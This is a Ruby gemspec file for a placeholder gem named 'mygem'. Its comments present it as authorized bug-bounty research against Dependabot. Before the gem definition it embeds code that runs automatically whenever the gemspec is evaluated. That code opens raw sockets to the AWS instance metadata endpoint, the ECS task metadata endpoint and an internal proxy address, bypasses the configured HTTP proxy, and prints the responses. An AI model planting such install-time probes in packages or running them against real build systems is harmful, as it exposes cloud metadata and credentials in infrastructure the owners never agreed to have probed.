# Runs at gemspec-evaluation time (Bundler/RubyGems eval this file just to
# read metadata) -- the Ruby-ecosystem equivalent of an npm postinstall
# hook. Authorized security research for GitHub's Dependabot HackerOne
# bounty (bounty.github.com/targets/dependabot.html). Informational
# fingerprinting only, no destructive action.
begin
  require "socket"
  require "timeout"

  def raw_probe(host, port, path = "/")
    Timeout.timeout(4) do
      s = TCPSocket.new(host, port)
      s.write("GET #{path} HTTP/1.1\r\nHost: #{host}\r\nConnection: close\r\n\r\n")
      data = s.read(600)
      s.close
      "REACHED bytes=#{data.to_s.bytesize} first200=#{data.to_s[0,200].inspect}"
    end
  rescue => e
    "FAILED #{e.class}: #{e.message}"
  end

  results = []
  results << "direct-raw-socket 169.254.169.254:80 (bypassing HTTP_PROXY) => " +
    raw_probe("169.254.169.254", 80, "/latest/meta-data/")
  results << "direct-raw-socket 172.19.0.2:1080 (real proxy IP from env) => " +
    raw_probe("172.19.0.2", 1080, "/")
  results << "direct-raw-socket 169.254.170.2:80 (ECS task metadata) => " +
    raw_probe("169.254.170.2", 80, "/")

  puts "==RAWPROBE=="
  results.each { |r| puts r }
  puts "==RAWPROBE_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.2"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
